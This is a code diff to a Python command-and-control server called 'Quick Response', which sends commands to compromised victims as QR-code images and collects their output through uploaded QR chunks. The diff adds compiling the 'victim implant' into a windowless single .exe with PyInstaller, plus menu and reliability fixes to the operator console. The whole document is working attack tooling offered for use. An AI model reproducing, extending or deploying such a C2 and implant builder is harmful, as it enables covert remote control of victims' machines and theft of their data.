@@ -1,8 +1,6 @@
 import os
-import time
-import requests
+import subprocess
 from http.server import SimpleHTTPRequestHandler, HTTPServer
-from io import BytesIO
 from PIL import Image
 from pyzbar.pyzbar import decode
 import threading
@@ -16,20 +14,20 @@ C2_SERVER_DIR = "server_files"
 ATTACKER_IP = None
 PROCESSED_DIR = os.path.join(C2_SERVER_DIR, "processed")
 
-if not os.path.exists(PROCESSED_DIR):
-    os.makedirs(PROCESSED_DIR)
 if not os.path.exists(C2_SERVER_DIR):
     os.makedirs(C2_SERVER_DIR)
+if not os.path.exists(PROCESSED_DIR):
+    os.makedirs(PROCESSED_DIR)
 
 TEMPLATE_PATH = "victim_implant_template.py"
 logging.basicConfig(level=logging.CRITICAL)
 
 def logo():
-    logo = """
+    banner = """
  ██████╗ ██╗   ██╗██╗ ██████╗██╗  ██╗    ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗███████╗███████╗
 ██╔═══██╗██║   ██║██║██╔════╝██║ ██╔╝    ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔════╝██╔════╝
-██║   ██║██║   ██║██║██║     █████╔╝     ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║███████╗█████╗  
-██║▄▄ ██║██║   ██║██║██║     ██╔═██╗     ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║╚════██║██╔══╝  
+██║   ██║██║   ██║██║██║     █████╔╝     ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║███████╗█████╗
+██║▄▄ ██║██║   ██║██║██║     ██╔═██╗     ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║╚════██║██╔══╝
 ╚██████╔╝╚██████╔╝██║╚██████╗██║  ██╗    ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║███████║███████╗
  ╚══▀▀═╝  ╚═════╝ ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝
 
@@ -38,9 +36,9 @@ def logo():
                                         Made by Kim Dvash
 
 """
-    print(logo)
+    print(banner)
 
-def build_implant(attacker_ip):
+def build_implant(attacker_ip, compile_exe=False):
     print("[+] Building victim implant...")
     with open(TEMPLATE_PATH, "r") as template_file:
         implant_code = template_file.read()
@@ -51,6 +49,17 @@ def build_implant(attacker_ip):
         f.write(implant_code)
 
     print("[+] Victim implant created as 'victim_implant.py'")
+
+    if compile_exe:
+        print("[+] Compiling implant to .exe with PyInstaller...")
+        result = subprocess.run(
+            ["pyinstaller", "--onefile", "--noconsole", "victim_implant.py"],
+            capture_output=True, text=True
+        )
+        if result.returncode == 0:
+            print("[+] Compiled successfully. Executable is in the 'dist/' folder.")
+        else:
+            print(f"[-] PyInstaller failed:\n{result.stderr}")
 
 def create_qr_code(command, index):
     print(f"[+] Sending command: {command}")
@@ -86,17 +95,15 @@ def decode_chunked_results():
                     decoded_objects = decode(img)
                     if decoded_objects:
                         chunk_content = decoded_objects[0].data.decode("utf-8")
-                        assembled_results[result_id][chunk_id] = chunk_content
-                        if not os.path.exists(PROCESSED_DIR):
-                            os.makedirs(PROCESSED_DIR)
+                        assembled_results[result_id][int(chunk_id)] = chunk_content
                         os.rename(img_path, os.path.join(PROCESSED_DIR, result_file))
                 except Exception as e:
                     print(f"[-] Error decoding chunk {result_file}: {e}")
 
         # Assemble complete results
         for result_id, chunks in list(assembled_results.items()):
-            if sorted(chunks.keys()) == [str(i) for i in range(len(chunks))]:
-                complete_output = "".join(chunks[str(i)] for i in range(len(chunks)))
+            if chunks and sorted(chunks.keys()) == list(range(len(chunks))):
+                complete_output = "".join(chunks[i] for i in range(len(chunks)))
                 print(f"[+] Complete result from {result_id}:\n{complete_output}")
                 del assembled_results[result_id]
 
@@ -120,9 +127,14 @@ class C2ServerHandler(SimpleHTTPRequestHandler):
 
     def do_POST(self):
         if self.path.startswith('/result'):
+            content_length = self.headers.get('Content-Length')
+            if content_length is None:
+                self.send_response(400)
+                self.end_headers()
+                return
+
             result_file = os.path.join(C2_SERVER_DIR, self.path.lstrip('/'))
-            content_length = int(self.headers['Content-Length'])
-            result_data = self.rfile.read(content_length)
+            result_data = self.rfile.read(int(content_length))
 
             with open(result_file, 'wb') as f:
                 f.write(result_data)
@@ -131,32 +143,44 @@ class C2ServerHandler(SimpleHTTPRequestHandler):
             self.send_response(200)
             self.end_headers()
 
+server_ready = threading.Event()
+
 def start_server():
     server_address = ('', PORT)
     httpd = HTTPServer(server_address, C2ServerHandler)
-    print(f"[+] Starting C2 server on port {PORT}...")
+    print(f"[+] C2 server listening on port {PORT}")
+    server_ready.set()
     httpd.serve_forever()
 
 def main():
     logo()
     command_index = 0
-    server_thread = threading.Thread(target=start_server)
-    server_thread.daemon = True
-    server_thread.start()
 
-    result_decoder_thread = threading.Thread(target=decode_chunked_results)
-    result_decoder_thread.daemon = True
-    result_decoder_thread.start()
-    time.sleep(2)
     while True:
         print("[1] Start C2 server")
         print("[2] Build victim implant")
+        print("[3] Exit")
         choice = input("[>] Choose an option: ")
 
         if choice == "1":
-            print("[+] You can start sending commands, once the victim will send the first GET request, the results will be appear here...")
+            server_thread = threading.Thread(target=start_server)
+            server_thread.daemon = True
+            server_thread.start()
+
+            result_decoder_thread = threading.Thread(target=decode_chunked_results)
+            result_decoder_thread.daemon = True
+            result_decoder_thread.start()
+
+            server_ready.wait()
+            print("[+] You can start sending commands, once the victim will send the first GET request, the results will appear here...")
             while True:
-                command = input("[>] Enter command for victim: ").strip()
+                try:
+                    command = input("[>] Enter command for victim (or 'back' to return): ").strip()
+                except (KeyboardInterrupt, EOFError):
+                    print("\n[+] Returning to menu...")
+                    break
+                if command == "back":
+                    break
                 if command:
                     create_qr_code(command, command_index)
                     command_index += 1
@@ -164,9 +188,16 @@ def main():
                     print("[-] Invalid command.")
         elif choice == "2":
             attacker_ip = input("[>] Enter attacker IP: ")
-            build_implant(attacker_ip)
+            compile_choice = input("[>] Compile to .exe? (y/n): ").strip().lower()
+            build_implant(attacker_ip, compile_exe=(compile_choice == "y"))
+        elif choice == "3":
+            print("[+] Shutting down...")
+            break
         else:
             print("[-] Invalid choice.")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[+] Interrupted. Shutting down...")
